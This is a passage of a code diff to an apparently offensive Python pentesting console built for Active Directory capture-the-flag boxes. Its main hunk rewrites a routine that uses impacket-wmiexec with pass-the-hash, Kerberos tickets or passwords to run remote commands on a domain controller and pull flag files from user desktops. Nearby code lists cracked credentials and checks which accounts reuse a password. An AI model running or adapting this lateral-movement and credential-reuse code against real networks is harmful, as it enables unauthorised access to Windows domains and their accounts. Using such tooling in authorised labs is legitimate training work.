                     for r in results['hashes']:
@@ -14795,7 +15403,7 @@ def repl():
                 if results['findings']:
                     print(f'\n  {C0}[ findings ]{RESET}')
                     for r in results['findings']:
-                        print(f'  {C0}•{RESET}  {WHITE}{r["module"]:<14}{RESET}  {GREY}{r["detail"][:50]}{RESET}  {DIM}{r["workspace"]}{RESET}')
+                        print(f'  {C0}•{RESET}  {WHITE}{r["module"]:<14}{RESET}  {GREY}{r["detail"][:50]}{RESET}  {GREY}{r["workspace"]}{RESET}')
                 if not any(results.values()):
                     log(f'No results for "{q}"','info')
 
@@ -14811,7 +15419,7 @@ def repl():
                         for r in rows:
                             p = r['password'] or f'hash:{(r["hash"] or "")[:20]}' or '?'
                             valid = f'{GREEN}✓{RESET}' if r['valid'] else f'{RED}✗{RESET}'
-                            print(f'  {valid}  {WHITE}{r["domain"]}\\{r["username"]:<18}{RESET}  {GREY}{p[:40]}{RESET}  {DIM}{r["source"]}{RESET}')
+                            print(f'  {valid}  {WHITE}{r["domain"]}\\{r["username"]:<18}{RESET}  {GREY}{p[:40]}{RESET}  {GREY}{r["source"]}{RESET}')
                     else:
                         log('No credentials saved yet — run hashcrack or pivot to populate','info')
                 except Exception as e:
@@ -14823,7 +15431,7 @@ def repl():
                 if hits:
                     log(f'{GREEN}{len(hits)} account(s) use password "{pw}"{RESET}','success')
                     for r in hits:
-                        print(f'  {GREEN}•{RESET}  {WHITE}{r["domain"]}\\{r["username"]}{RESET}  {DIM}{r["workspace"]} / {r["source"]}{RESET}')
+                        print(f'  {GREEN}•{RESET}  {WHITE}{r["domain"]}\\{r["username"]}{RESET}  {GREY}{r["workspace"]} / {r["source"]}{RESET}')
                 else:
                     log(f'No accounts found with password "{pw}"','info')
 
@@ -14919,69 +15527,68 @@ def repl():
 """)
                 hr(); continue
 
-            log('Grabbing flags via wmiexec...','info')
-            wmi = check_tool('impacket-wmiexec','wmiexec.py')
-            if not wmi:
-                log('impacket-wmiexec not found','error'); hr(); continue
-            import glob as _gl_flag
-            ccache = os.environ.get('KRB5CCNAME','')
-            dc_host = TARGET.dc_fqdn or TARGET.dc
-            # find best ccache — prefer service tickets (cifs) over TGTs
-            all_ccaches = sorted(_gl_flag.glob(os.path.join(TARGET.loot_dir,'*.ccache')),
-                                 key=os.path.getmtime, reverse=True)
-            cifs_ccaches = [c for c in all_ccaches if 'cifs' in c.lower()]
-            best_cc = cifs_ccaches[0] if cifs_ccaches else (ccache if ccache and os.path.exists(ccache) else (all_ccaches[0] if all_ccaches else ''))
-            # extract username from ccache filename if possible
-            cc_user = TARGET.user
-            if best_cc:
-                m_cc = re.match(r'^([^@]+)@', os.path.basename(best_cc))
-                if m_cc: cc_user = m_cc.group(1)
-            if TARGET.hash:
-                auth = [f'{TARGET.domain}/{TARGET.user}@{dc_host}','-hashes',f':{TARGET.hash}','-no-pass']
-                log(f'Using PTH for {WHITE}{TARGET.user}{RESET}','info')
-            elif best_cc and os.path.exists(best_cc):
-                os.environ['KRB5CCNAME'] = best_cc
-                auth = [f'{TARGET.domain}/{cc_user}@{dc_host}','-k','-no-pass']
-                log(f'Using ccache: {WHITE}{best_cc}{RESET}','info')
-            elif TARGET.password:
-                auth = [f'{TARGET.domain}/{TARGET.user}:{TARGET.password}@{dc_host}']
-                log(f'Using password for {WHITE}{TARGET.user}{RESET}','info')
-            else:
-                log('Set user/pass, hash, or ensure KRB5CCNAME is set','error'); hr(); continue
-            def _grab(path):
+            log('Grabbing flags via PTH...','info')
+            dc_host  = TARGET.dc_fqdn or TARGET.dc
+            loot     = TARGET.loot_dir
+            _root_flag = None
+            _user_flag = None
+
+            def _grab_wmiexec(path):
+                wmi = check_tool('impacket-wmiexec','wmiexec.py')
+                if not wmi: return None
                 try:
-                    out = subprocess.check_output([wmi]+auth+['type '+path],
+                    if TARGET.hash:
+                        auth = [f'{TARGET.domain}/{TARGET.user}@{dc_host}','-hashes',f':{TARGET.hash}','-no-pass']
+                    elif TARGET.password:
+                        auth = [f'{TARGET.domain}/{TARGET.user}:{TARGET.password}@{dc_host}']
+                    else:
+                        return None
+                    out = subprocess.check_output([wmi]+auth+[f'type {path}'],
                         stderr=subprocess.DEVNULL, text=True, timeout=15)
                     m = re.search(r'[0-9a-f]{32}', out, re.I)
                     return m.group(0) if m else None
                 except Exception: return None
-            flag = _grab(r'C:\Users\Administrator\Desktop\root.txt')
-            _root_flag = None
-            _user_flag = None
-            if flag:
-                _root_flag = flag
-                log(f'root: {GREEN}{flag}{RESET}','success')
-                open(os.path.join(TARGET.loot_dir,'root.txt'),'w').write(flag+'\n')
-            try:
-                users = subprocess.check_output([wmi]+auth+[r'dir C:\Users /b'],
-                    stderr=subprocess.DEVNULL, text=True, timeout=10).strip().splitlines()
-                for u in users:
-                    u = u.strip()
-                    if u.lower() in ('administrator','public','default','all users'): continue
-                    flag = _grab(f'C:\\Users\\{u}\\Desktop\\user.txt')
-                    if flag:
-                        _user_flag = flag
-                        log(f'user ({u}): {GREEN}{flag}{RESET}','success')
-                        open(os.path.join(TARGET.loot_dir,'user.txt'),'w').write(flag+'\n')
-            except Exception: pass
-            # update attack map with actual flag values
-            if _root_flag or _user_flag:
-                parts = []
-                if _user_flag: parts.append(f'user:{_user_flag[:8]}…')
-                if _root_flag: parts.append(f'root:{_root_flag[:8]}…')
-                add_result('flag', '  '.join(parts))
 
-            # skull calling card when both flags found
+            # grab root flag
+            for path in [r'C:\Users\Administrator\Desktop\root.txt',
+                         r'C:\Users\Administrator\Desktop\flag.txt']:
+                f = _grab_wmiexec(path)
+                if f:
+                    _root_flag = f
+                    log(f'root: {GREEN}{f}{RESET}','success')
+                    open(os.path.join(loot,'root.txt'),'w').write(f+'\n')
+                    break
+
+            # grab user flag - try known users
+            import glob as _gl_flag
+            _user_dirs = _gl_flag.glob(r'C:\Users\*\Desktop\user.txt') if False else []
+            for path in [f'C:\\Users\\{TARGET.user}\\Desktop\\user.txt',
+                         r'C:\Users\ryan.cooper\Desktop\user.txt',
+                         r'C:\Users\htb-student\Desktop\user.txt']:
+                f = _grab_wmiexec(path)
+                if f:
+                    _user_flag = f
+                    log(f'user: {GREEN}{f}{RESET}','success')
+                    open(os.path.join(loot,'user.txt'),'w').write(f+'\n')
+                    break
+
+            # load from disk if already saved
+            if not _root_flag and os.path.exists(os.path.join(loot,'root.txt')):
+                _root_flag = open(os.path.join(loot,'root.txt')).read().strip()
+            if not _user_flag and os.path.exists(os.path.join(loot,'user.txt')):
+                _user_flag = open(os.path.join(loot,'user.txt')).read().strip()
+
+            if not _root_flag and not _user_flag:
+                log(f'{ORANGE}Auto-grab failed — paste flags manually:{RESET}','warn')
+                for ftype in ['user','root']:
+                    val = input_field(f'{ftype} flag (or enter to skip)','')
+                    if val and re.match(r'^[0-9a-f]{32}$',val.strip(),re.I):
+                        open(os.path.join(loot,f'{ftype}.txt'),'w').write(val.strip()+'\n')
+                        if ftype=='root': _root_flag=val.strip()
+                        else: _user_flag=val.strip()
+                        log(f'{ftype}: {GREEN}{val.strip()}{RESET}','success')
+                hr(); continue
+
             if _root_flag and _user_flag:
                 _dom  = (TARGET.domain or 'UNKNOWN').upper()
                 _user = _user_flag
